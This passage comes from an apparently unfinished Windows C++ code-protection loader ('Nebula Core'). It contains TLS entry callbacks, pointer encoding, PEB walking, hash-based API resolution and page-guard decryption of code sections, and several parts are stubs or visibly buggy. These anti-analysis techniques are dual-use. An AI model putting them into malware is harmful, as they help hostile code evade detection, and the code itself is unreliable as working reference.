			// Stage 4:
			wchar SystemDirectory[MAX_PATH];
			GetSystemDirectoryW(SystemDirectory, MAX_PATH);
			wchar BCryptDll[MAX_PATH];
			// ldr::GetSystemDllbyHash(SystemDirectory, N_BCRYPTDLL, BCryptDll);
			// handle BCry = LoadLibraryW(BCryptDll);
			// auto BCryptOpenAlgorithmProvider = (cry::bcryoap_t)utl::ImportFunctionByHash(BCry, N_BCOALGPRO);

			i64 BaseDelta = (i64)BaseAddress - 0x140000000;
			for (u8 i = 0; i < 4; i++) {
				IMAGE_SECTION_HEADER* Section = nullptr; //  utl::FindSection(NtHeader, ProtectedSections[i]);
				if (!Section)
					continue;

				// Reverse Relocs (reverse damage done by Ldr to the protected sections)
				void* SectionAddress = (void*)((ptr)Section->VirtualAddress + (ptr)BaseAddress);
				dword OldProtection;
				VirtualProtect(SectionAddress, Section->Misc.VirtualSize, PAGE_READWRITE, &OldProtection);
				status SLdr = ldr::ApplyBaseRelocationsOnSection(BaseAddress, Section, nullptr, -BaseDelta);
				if (S_ERROR(SLdr))
					ExitProcess(SLdr);

				// Decrypt Data

				// Uncompress LZ77+Huffman

				// Reapply BaseRelocations
				ldr::ApplyBaseRelocationsOnSection(BaseAddress, Section, nullptr, BaseDelta);
			}
		} break;
	case DLL_PROCESS_DETACH:
		{

		} break;
	}
}
// ThreadLocalStorage datatemplate and reference table
EXTERN_C EXPORT u32 TlsLoaderConfiguation     = 0;
EXTERN_C EXPORT u8  Nb0ProtectedSectionKey[8] = { 0 };
extern "C" {
	u32 _tls_index = 0;
	const PIMAGE_TLS_CALLBACK _tls_callback[] = {
		(PIMAGE_TLS_CALLBACK)NebulaTlsEntry,
		(PIMAGE_TLS_CALLBACK)nullptr
	};

#pragma comment (linker, "/include:_tls_used")
	extern const IMAGE_TLS_DIRECTORY64 _tls_used = {
		(ptr)0, (ptr)0,      // tls data (unused)
		(ptr)&_tls_index,    // address of tls_index
		(ptr)&_tls_callback, // pointer to call back array
		(u32)0, (u32)0       // tls properties
	};
}
#pragma endregion


#pragma region Other
poly CodePointer(
	_In_ poly x
) {
	// encode 2.0:
	// usermode memory has a addressrange of 0x0000xxxxxxxxxxxx
	// the upper 16bits are reserved for kernel (0xffffxxxxxxxxxxxx,
	// technically we have 17 bits because usermode is still limited to the lower 44bits)
	// we can use those 16 bits in order to store a state used in a algorithim to encode / decode the object
	// we can also automatically detect if its encoded and therefore automatically select the operation

	// encoded codestate format
	// bbbbb - b       - bbbbb/bbbbb - bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
	// 58rot | encoded | 32/32rot    | 48-Bit Pointer

	dword RtlState;

#define SX(y) ((x >> y) & 0x1f) // Get 5bits of state on offset
#define MX    SX(59)            // The offset to rotate (58rot) | 0xfc00000000000000
#define IX    (58 - MX)         // Mathematical inverse MX (ignore encode bit)
	if (x >> 58 & 1) {
		x ^= g_.ProcessCookie & 0xffffull << 48;                               // Demutate 15bit state
		u64 v1 = (x & 0x03ffffffffffffff) >> MX;                               // 58shift upper
		u64 v2 = (x << IX) & ~(0xfcull << 56);                                 // 58shift lower
		x = (v1 | v2) | x & 0xfcull << 56;                                     // 58rotr combine
		x ^= g_.ProcessCookie & 0xffffffffffff;                                // Demutate 48bit pointer
		x = (u64)_rotl((u32)(x >> 16), SX(48)) << 16 | x & 0xffff00000000ffff; // Untranslate upper 48ptr
		x = (u64)_rotr((u32)x, SX(53)) | x & 0xffffull << 32;                  // Untranslate lower 48ptr
	} else {
		// Initial pointer translation and state introduction
		x |= (u64)RtlRandomEx(&RtlState) << 48;                                // x[63:48] = Random
		x = (u64)_rotl((u32)x, SX(53)) | x & 0xffffffff00000000;               // 0x03e0000000000000 | 0x00000000><<<<<<<
		x = (u64)_rotr((u32)(x >> 16), SX(48)) << 16 | x & 0xffff00000000ffff; // 0x001f000000000000 | 0x0000>>>>>>><0000

		// Mutate [47:0] (48bit pointer)
		x ^= g_.ProcessCookie & 0x0000ffffffffffff;

		// translate 32/32rotlr state into pointer by 58rotl [57:0]
		u64 v1 = (x << MX) & 0x03ffffffffffffff;
		u64 v2 = (x >> IX) & (1ull << MX) - 1;
		x = (v1 | v2) | x & 0xfc00000000000000; // 0x03ffffffffffffff | 0x03><<<<<<<<<<<<<

		// Finalize by mutating state [63:48 & ^58] and enabling the encoded bitflag
		x = x ^ g_.ProcessCookie & 0xffffull << 48 | 1ull << 58;
	}
#undef IX
#undef MX
#undef SX

	return x;
}
#pragma endregion

RUNTIME_FUNCTION* GetRuntimeFunctionEntry( // Retrieves the rtf entry in the .pdata exception table
	_In_ handle Module,                    // The module from which to retrive the rtf table
	_In_ void*  VirtualAddress             // The virtual address of the function
) {
	IMAGE_NT_HEADERS* NtHeader = utl::GetNtHeader(Module);
	IMAGE_DATA_DIRECTORY* Directory = &NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	RUNTIME_FUNCTION* RtfTable = (RUNTIME_FUNCTION*)((ptr)Directory->VirtualAddress + (ptr)Module);

	auto FunctionRva = (u32)((ptr)VirtualAddress - (ptr)Module);
	for (auto i = 0; i < Directory->Size / sizeof(RUNTIME_FUNCTION); i++){
		if (RtfTable[i].BeginAddress == FunctionRva)
			return &RtfTable[i];
	}

	return nullptr;
}

NbTableEntry* NbGetCryptDataTableEntry( // Retrieves the crypt table entry from ".nb$ft::"
	_In_ handle Module,                 // The module containing the cdt
	_In_ void*  VirtualAddress          // The absolute address of the function to search for
) {
	auto CdTable = (NbTableEntry*)&FirstNbEntry;

	while (CdTable.AbsoluteAddress) {
		if (CdTable.AbsoluteAddress == VirtualAddress) // the virtaddr field is a absoluet value included in the base relocations
			return CdTable;
		CdTable++;
	}

	return nullptr;
}


class NbCrypt {
	struct VisiEntry {
		void*             VirtualAddress;       // The address passed to the decipher function
		u32               ReferenceCounter;     // The number of times this object has been referenced
		NbTableEntry*     VirtualOfTableEntry;  // The address of the entry in the ctable (.nbft)
		RUNTIME_FUNCTION* OptionalFunctionLink; // The address of the runtime fucntion entry in pdata
	};
	struct PageGuardEntry {
		void*             VirtualAddress; // The absolute address of the function to automatically service
		u32               SizeOfFunction; // The length of the function (used to check if the trap is within bounds)
		handle            VisiListObject; // A link to a object in the visi list used by the trap handler
	};

public:
	static handle DecipherEntry(
		_In_ void* VirtualAddress
	) {
		VisiList.LockListExclusive();
		auto Object = VisiList.GetFirstObject();
		if (Object) { // Search list if object already exists
			do {
				auto Entry = (VisiEntry*)VisiList.GetObjectAddress(Object);
				if (Entry->VirtualAddress == VirtualAddress) {
					// if entry already has been decrypted increase its reference counthas
					Entry->ReferenceCounter++;
					VisiList.UnlockList();
					return Object;
				}
			} while (Object = VisiList.GetNextObject(Object));
		}

		// Object doesnt exist yet, so lets create it
		Object = VisiList.AllocateObject(sizeof(VisiEntry));
		auto Entry = (VisiEntry*)VisiList.GetObjectAddress(Object);

		// Initialize Object
		Entry->VirtualAddress = VirtualAddress;
		Entry->ReferenceCounter = 1;
		Entry->VirtualOfTableEntry = NbGetCryptDataTableEntry(g_.ModuleBase, VirtualAddress);
		Entry->OptionalFunctionLink = GetRuntimeFunctionEntry(g_.ModuleBase, VirtualAddress);

		// Decrypt Function


		VisiList.UnlockList();
		return Object;
	}

	static handle FreeObject(
		_In_ handle Object
	) {
		VisiList.LockListExclusive();
		auto Entry = (VisiEntry*)VisiList.GetObjectAddress(Object);

		if (Entry->ReferenceCounter-- == 0) {
			// reencrypt the function



			VisiList.DestroyObject(Object);
		}

		VisiList.UnlockList();
	}

	static handle RegisterPageGuardFunction( // Registers a function for automatic ciphering mode
	                                         // Functions registered as automatic are to be considered as single threaded
	                                         // and cannot be called by multiple threads at the same time due to how pageguards work
	                                         // Failure to ensure concurrency can result in deadlocks, exceptions and other #UB
		_In_ void* VirtualAddress            // The virtual address of the function to register
	) {
		AutoFList.LockListExclusive();

		// Allocate page guard entry in auto list
		auto RtfEntry = GetRuntimeFunctionEntry(g_.ModuleBase, VirtualAddress);
		auto PgObject = AutoFList.AllocateObject(sizeof(PageGuardEntry));
		auto PgEntry = (PageGuardEntry*)AutoFList.GetObjectAddress(PgObject);
		PgEntry->VirtualAddress = VirtualAddress;
		PgEntry->SizeOfFunction = RtfEntry->EndAddress - RtfEntry->BeginAddress;

		// Set PageGuard
		MEMORY_BASIC_INFORMATION FunctionMemoryInformation;
		VirtualQuery(VirtualAddress, &FunctionMemoryInformation, sizeof(FunctionMemoryInformation));
		u32 OldProtection;
		VirtualProtect(VirtualAddress, PgEntry->SizeOfFunction,
			FunctionMemoryInformation.Protect | PAGE_GUARD, &OldProtection);

		AutoFList.UnlockList();
		return PgObject;
	}

private:
	static i32 TrapExcpetionHandler(
		_In_ EXCEPTION_POINTERS* ExceptionInfo
	) {
		static PageGuardEntry* CachedPgEntry;
		auto ExceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
		auto ExceptionAddress = ExceptionInfo->ExceptionRecord->ExceptionAddress;

		// Only handle
		if (ExceptionCode != STATUS_GUARD_PAGE_VIOLATION &&
			ExceptionCode != STATUS_SINGLE_STEP)
			return EXCEPTION_CONTINUE_SEARCH;

		// Get The pageguard entry
		AutoFList.LockListShared();
		auto PgEnumerator = AutoFList.GetFirstObject();
		PageGuardEntry* PgEntry;
		do {
			PgEntry = (PageGuardEntry*)AutoFList.GetObjectAddress(PgEnumerator);
			if (PgEntry->VirtualAddress <= ExceptionAddress &&
				(ptr)PgEntry->VirtualAddress + PgEntry->SizeOfFunction >= (ptr)ExceptionAddress)

				break;
		} while (PgEnumerator = AutoFList.GetNextObject(PgEnumerator));
		VisiList.UnlockList();

		if (PgEntry) {
			// Chache PgEntry
			CachedPgEntry = PgEntry;

			// Found the fitting entry, check if the function is currently being used
			if (!PgEntry->VisiListObject)
				PgEntry->VisiListObject = DecipherEntry(PgEntry->VirtualAddress);

			// now let the function execute byste
			// TODO: continue coding here

			return EXCEPTION_CONTINUE_EXECUTION;
		}

		return EXCEPTION_CONTINUE_SEARCH;
	}

	static handle InitializeNbCryptService() {
		return AddVectoredExceptionHandler(null, TrapExcpetionHandler);
	}

	static DoublyLinkedList VisiList;
	static DoublyLinkedList AutoFList;
};

// To be implemented
class Nanomite {
public:

private:

};


N_PROTECTEDX status LoadPluginModule(
	_In_ const void* Module
) {
	// Map Image into Process, e.g.
	// handle mod = ldr.MapImage(Module, MEM_PRIVATE)

	// Run EntryPoint

	return 0;
}

N_PROTECTEDX i32 __cdecl NebulaCoreEntry() {
#ifdef _DEBUG
	__debugbreak();
#endif

	__try {
		*(char*)0x0 = 0;
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		__debugbreak();
	}

	return SUCCESS;
}

```

`src/riftldr/ldr.cpp`:

```cpp
#include "ldr.h"

namespace ldr {
	// GS:0x60(void*) -> PEB Linear Address
	// PEB:LoaderData(void*)                                    @ offset 0x18 (x64)
	// PEB_LDR_DATA:InMemoryOrderModuleList(LIST_ENTRY)         @ offset 0x20 (x64)
	// LDR_DATA_TABLE_ENTRY:InMemoryOrderModuleList(LIST_ENTRY) @ offset 0x10 (x64)
	// LDR_DATA_TABLE_ENTRY:DllBase(void*)                      @ offset 0x30 (x64)
	// LDR_DATA_TABLE_ENTRY:SizeOfImage(ULONG)                  @ offset 0x40 (x64)
	// LDR_DATA_TABLE_ENTRY:BaseDllName(UNICODE_STRING)         @ offset 0x58 (x64)
	LIST_ENTRY* GetModuleList() {
		auto PEB = (void*)__readgsqword(0x60);        // Get PEB
		auto LoaderData = (void*)((ptr)PEB + 0x18);   // Get PEB:LoaderDara
		LoaderData = *(void**)LoaderData;             // Get Linear Address of LoaderData
		return (LIST_ENTRY*)((ptr)LoaderData + 0x20); // Get List
	}
	handle GetModuleHandleThroughPeb(
		_In_ const wchar* ModuleName
	) {
		auto InMemoryOrderModuleList = GetModuleList();
		auto ListIterator = InMemoryOrderModuleList;
		while (ListIterator->Flink != InMemoryOrderModuleList) {
			ListIterator = ListIterator->Flink;

			auto DllName = (UNICODE_STRING*)((ptr)ListIterator + 0x48); // Get DllBaseName
			auto ModuleNameSize = wcslen(ModuleName) * sizeof(*ModuleName);
			if (DllName->Length == ModuleNameSize)
				if (RtlCompareMemory(DllName->Buffer, ModuleName, ModuleNameSize) == ModuleNameSize)
					return (handle)((ptr)ListIterator + 0x20); // Get DllBaseAddress
		}

		return nullptr;
	}
	handle GetModuleHandleByHash( // Gets the modulehandle by hash over the InMemoryOrderModuleList
		_In_ u64 Hash             // The DllBaseName hash to search for
	) {
		auto InMemoryOrderModuleList = GetModuleList();
		auto ListIterator = InMemoryOrderModuleList;
		while (ListIterator->Flink != InMemoryOrderModuleList) {
			ListIterator = ListIterator->Flink;
			auto DllName = (UNICODE_STRING*)((ptr)ListIterator + 0x48); // Get DllBaseName

			// Convert string to lowercase
			wchar Buffer[MAX_PATH];
			__movsb((byte*)Buffer, (byte*)DllName->Buffer, DllName->Length);
			Buffer[DllName->Length / 2] = L'\0';
			_wcslwr(Buffer);

			if (utl::Fnv1a64Hash(Buffer, DllName->Length) == Hash)
				return *(handle*)((ptr)ListIterator + 0x20); // Get DllBaseAddress
		}

		return nullptr;
	}

	void* ImportFunctionByHash(   // Imports a function and retrieves its pointer by hash
		_In_ const handle Module, // The module to search in
		_In_ const u64    Hash    // The functionhash to search for
	) {
		auto NtHeader = utl::GetNtHeader(Module);
		if (!NtHeader)
			return nullptr;

		auto ModuleBase = (ptr)Module;
		auto ExportDirectory = (IMAGE_EXPORT_DIRECTORY*)
			((ptr)NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + ModuleBase);
		auto ppNameTable = (dword*)((ptr)ExportDirectory->AddressOfNames + ModuleBase);

		for (u32 i = 0; i < ExportDirectory->NumberOfNames; i++) {
			auto FunctionName = (const char*)((ptr)ppNameTable[i] + ModuleBase);
			auto InternalHash = utl::Fnv1a64Hash((void*)FunctionName, strlen(FunctionName));

			if (InternalHash == Hash) {
				auto OrdinalTable = (word*)((ptr)ExportDirectory->AddressOfNameOrdinals + ModuleBase);
				auto FunctionTable = (dword*)((ptr)ExportDirectory->AddressOfFunctions + ModuleBase);
				return (void*)((ptr)FunctionTable[OrdinalTable[i]] + ModuleBase);
			}
		}

		return nullptr; // No matching import found
	}

	#undef SearchPath            // Because WinAPI
	status GetSystemDllbyHash(   // Locates a system Dll by hash
		_In_  wchar* SearchPath, // The Path to search for a matching dll
		_In_  u64    Hash,       // The hash of teh DllBaseName (Lowercase hash)
		_Out_ wchar* Path        // A buffer the full path of a matching dll will be written to
	) {
	#if 0 // Just Import it, no reason to hide (crt functions)
		typedef wchar* (__cdecl* wcscat_t)(
			_Inout_z_       wchar* strDestination,
			_In_z_    const wchar* strSource
			);
		handle NT = GetModuleHandleByHash(N_NTDLL);
		wcscat_t wcscat = (wcscat_t)ImportFunctionByHash(NT, N_CRTWCSCAT);
	#endif

		wchar InternalPath[MAX_PATH];
		__movsb((byte*)InternalPath, (byte*)SearchPath, (wcslen(SearchPath) + 1) * sizeof(wchar));
		wcscat(InternalPath, L"\\*.dll");

	#if 0 // Same as above
		typedef wchar* (__cdecl* wcslwr_t)(
			wchar* str
			);
		wcslwr_t _wcslwr = (wcslwr_t)ImportFunctionByHash(NT, N_CRTWCSLWR);
	#endif

		WIN32_FIND_DATAW fd;
		handle hFind = FindFirstFileW(InternalPath, &fd);
		if (hFind == INVALID_HANDLE_VALUE)
			return S_CREATE(SS_ERROR, SF_NULL, SC_INVALID_HANDLE);
		do {
			if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				_wcslwr(fd.cFileName);
				if (utl::Fnv1a64Hash(fd.cFileName, wcslen(fd.cFileName) * sizeof(wchar)) == Hash) {
					__movsb((byte*)Path, (byte*)SearchPath, (wcslen(SearchPath) + 1) * sizeof(wchar));
					wcscat(Path, L"\\");
					wcscat(Path, fd.cFileName);
					return SUCCESS;
				}
			}
		} while (FindNextFileW(hFind, &fd));

		return SUCCESS;
	}

	status ApplyBaseRelocationsOnSection(              // Applies Relocations on a Addressrange
		_In_     handle                Module,         // BaseAddress of the Module from which the .reloc section should be used from
		_In_     IMAGE_SECTION_HEADER* Section,        // A pointer to the sectionheader of which to apply the relocs
		_In_opt_ void* Address,        // The Address at which the relocations should be applied at (if null relocs will be applied to mapped image of BaseAddress)
		_In_     i64                   RelocationDelta // The pointerdelta that should be applied
	) {
		auto NtHeader = utl::GetNtHeader(Module);
		auto BaseRelocations = &NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		if (!Section)
			return S_CREATE(SS_ERROR, SF_NULL, SC_INVALID_PARAMETER);

		// Delta between the map at which to apply the relocs if used and the mapped image
		i64 MappingDelta = Address ? (i64)Address - ((i64)Section->VirtualAddress + (i64)Module) : 0;
		auto Iterator = (IMAGE_BASE_RELOCATION*)((ptr)BaseRelocations->VirtualAddress + (ptr)Module);

		while ((ptr)Iterator < (ptr)BaseRelocations + BaseRelocations->Size) {
			// Check if Iterator is withing bounds of the selected region
			if (Iterator->VirtualAddress >= Section->VirtualAddress &&
				Iterator->VirtualAddress < Section->VirtualAddress + Section->Misc.VirtualSize) {
				// First Relocation Entry
				const struct IMAGE_RELOCATION_ENTRY {
					word Offset : 12;
					word Type : 4;
				} *RelocationEntry = (IMAGE_RELOCATION_ENTRY*)(BaseRelocations + 1);

				// Iterate over Relocation Entries and apply changes
				ptr RelocationPage = (ptr)BaseRelocations->VirtualAddress + (ptr)Module;
				for (u16 j = 0; j < (Iterator->SizeOfBlock - sizeof(*BaseRelocations)) / sizeof(IMAGE_RELOCATION_ENTRY); j++)
					switch (RelocationEntry[j].Type) {
					case IMAGE_REL_BASED_HIGHLOW:
						{
							ptr RelocationAddress = RelocationPage + RelocationEntry[j].Offset;
							*(ptr*)(RelocationAddress + MappingDelta) += RelocationDelta;
							break;
						}
					case IMAGE_REL_BASED_ABSOLUTE:
						continue;
					default:
						return S_CREATE(SS_ERROR, SF_NULL, SC_UNSUPPORTED); // Unknown reloc Type
					}
			}

			// Advance to next reloc Block
			(ptr&)Iterator += Iterator->SizeOfBlock;
		}

		return SUCCESS;
	}
}

```

`src/riftldr/ldr.h`:

```h
// Nebula Core - self protecting "nano" kernel
#pragma once

#include "nbp.h"

#pragma region Protected Sections
// #pragma warning(disable : 4330)

// Protected Data-Section
#pragma section(N_PSRW1, read, write)
#pragma section(N_PSRW2, read, write)

// Merge protected sections
#pragma comment(linker, "/merge:.nbrw1=.nb1")
#pragma comment(linker, "/merge:.nbrw2=.nb2")

// Merge loader code into a loader section
#pragma comment(linker, "/merge:.text=.nb0")
#pragma comment(linker, "/merge:.data=.nb0")
#pragma comment(linker, "/merge:.rdata=.nb0")

// Declaration Protection Specification
#define N_PROTECTEDD ALLOC_DATA(N_PSRW1)
#define N_PROTECTEDX ALLOC_CODE(N_PS1)
#pragma endregion


namespace ldr {
	LIST_ENTRY* GetModuleList();
	#undef SearchPath
	status GetSystemDllbyHash(_In_ wchar* SearchPath, _In_ u64 Hash, _Out_ wchar* Path);
	void*  ImportFunctionByHash(_In_ handle Module, _In_ u64 Hash);
	handle GetModuleHandleByHash(_In_ u64 Hash);
	status ApplyBaseRelocationsOnSection(_In_ handle Module, _In_ IMAGE_SECTION_HEADER* Section, _In_opt_ void* Address, _In_ i64 RelocationDelta);
}

status ValidateImportAddressTable(_In_ handle Module);
poly CodePointer(_In_ poly x);
#define EncodePointer(ptr) (handle)CodePointer((poly)(ptr))
#define DecodePointer(ptr) (void*)CodePointer((poly)(ptr))

namespace utl {
	status GenerateSessionId(_Out_ u64& SessionId);
	status GenerateHardwareId(_Out_ u64& HardwareId);
}

class svc2 {
	typedef poly(__x64call* ServiceFunctionPointer)(poly FunctionContext);
	struct FunctionDispatchEntry {
		handle                 ModuleAssociation;
		u64                    FunctionId;
		ServiceFunctionPointer FunctionPointer;
	};

public:
	 svc2();
	~svc2();

	status RegisterServiceFunction(_In_ u64 FunctionId, _In_ ServiceFunctionPointer FunctionPointer);
	status ServiceCall(_In_ u64 ServiceId, _Out_ poly* ReturnValue, _In_opt_ poly ServiceParameters);

private:
	status SearchListForEntry(_In_ u64 ServiceId, _Out_ FunctionDispatchEntry*& FunctionEntry);

	handle m_DispatchTable; // Function-Dispatch-Table (HeapList storing the Services)
};
inline svc2* ServiceManager;

class DoublyLinkedList {           // Doubly Linked list that supports object allocation and object referencing
	struct ListEntry {             // Nodeobject allcoated and linked into the list
		ListEntry* NextEntry;      // A Pointerpair to tne next and previous entry in the list
		ListEntry* PreviousEntry;

		union {                   // this field contains either
			void* VirtualAddress; // The Address of the Buffer that stores the actual data
			i64   EntrySize;      // The size of the Object (if non reference object signbit is set)
		} Misc;
	};

public:
	// Constructors
	DoublyLinkedList(_In_ handle Heap);

	// Allocators
	handle AllocateObject(_In_ size_t ObjectSize);
	handle ReferenceObject(_In_ void* VirtualAddress);
	void   DestroyObject(_In_ handle Object);

	// Information translators
	void*  GetObjectAddress(_In_ handle Object);
	size_t GetObjectSize(_In_ handle Object);

	// Enumerators
	handle GetFirstObject();
	handle GetLastObject();
	handle GetNextObject(_In_ handle Object);
	handle GetPreviousObject(_In_ handle Object);

	void LockListExclusive();
	void LockListShared();
	void UnlockList();

private:
	ListEntry* AllocateEntryInternal(_In_ size_t ObjectSize);

	const handle m_MemoryContainer;            // The heap used to allocate elements

	struct _ListLock {
		SRWLOCK  SrwLockInternal;              // The internal SRWLOCK
		u32      OwningThread;                 // The Thread that owns the exclusive lock
		struct {
			u32  ExclusiveRecursionCount : 28; // The count of times the owning thread owns this lock
			u32  ExclusiveModeEnabled    :  1; // Marks if the Lock is in exclusive mode
		};
	}            m_ListLock;

	ListEntry*   m_FirstEntry;                 // A pointerpair pointing ot the first and last entry in the list
	ListEntry*   m_LastEntry;
};



// Global Managment Information
// has to be named because of a stupid compiler bug lol, bug report at:
// https://developercommunity.visualstudio.com/content/problem/1312147/c17-global-unnamed-inline-struct-may-not-be-the-sa.html
// Apparently its not a compilerbug, however i do not aggree with the way this is handled and this really doesnt seem to be
// Standard conform.
struct _NebulaInternalGlobalData {
	handle ModuleBase;

	u64 ProcessCookie;
	u8  CookieOffset;

	u64 HardwareId;
	u64 SessionId;

	handle NebulaHeap; // Encoded with CodePointer
} volatile inline g_;

```

`src/riftldr/riftldr.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="DebugLibrary|x64">
      <Configuration>DebugLibrary</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="DebugExecutable|x64">
      <Configuration>DebugExecutable</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="ReleaseLibrary|x64">
      <Configuration>ReleaseLibrary</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="ReleaseExecutable|x64">
      <Configuration>ReleaseExecutable</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{e7e1aa01-b370-4d91-85b2-93a096ac2f46}</ProjectGuid>
    <RootNamespace>riftldr</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugExecutable|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugLibrary|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseExecutable|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseLibrary|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
  </ImportGroup>
  <ImportGroup Label="Shared">
    <Import Project="..\shr\shr.vcxitems" Label="Shared" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='DebugExecutable|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='DebugLibrary|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='ReleaseExecutable|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseLibrary|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugExecutable|x64'">
    <OutDir>$(SolutionDir)out\bin\</OutDir>
    <IntDir>$(SolutionDir).in\$(projectName)\$(Configuration)\</IntDir>
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugLibrary|x64'">
    <OutDir>$(SolutionDir)out\bin\</OutDir>
    <IntDir>$(SolutionDir).in\$(projectName)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseExecutable|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)out\bin\</OutDir>
    <IntDir>$(SolutionDir).in\$(projectName)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseLibrary|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)out\bin\</OutDir>
    <IntDir>$(SolutionDir).in\$(projectName)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='DebugExecutable|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <ExceptionHandling>false</ExceptionHandling>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <RuntimeLibrary />
      <PreprocessorDefinitions>_DEBUG;_EXE</PreprocessorDefinitions>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <AdditionalOptions>
      </AdditionalOptions>
      <ConformanceMode>true</ConformanceMode>
      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
      <BufferSecurityCheck>false</BufferSecurityCheck>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <ShowProgress>LinkVerbose</ShowProgress>
      <MergeSections>
      </MergeSections>
      <EntryPointSymbol>NebulaCoreEntry</EntryPointSymbol>
      <AdditionalOptions>/ignore:4254 %(AdditionalOptions)</AdditionalOptions>
    </Link>
    <PostBuildEvent>
      <Command>"$(OutDir)riftbld.exe" /spp -fi:"$(TargetPath)" -sc:.nb0 -ch:e00000e0
"$(OutDir)riftbld.exe" /spp -fi:"$(TargetPath)" -sc:.nb1 -ch:000000e0
"$(OutDir)riftbld.exe" /spp -fi:"$(TargetPath)" -sc:.nb2 -ch:000000e0
copy "$(SolutionDir)src\sdk.h" "$(SolutionDir)out\sdk"
copy "$(SolutionDir)src\dbg.h" "$(SolutionDir)out\sdk"
copy "$(SolutionDir)src\base.h" "$(SolutionDir)out\sdk"</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='DebugLibrary|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
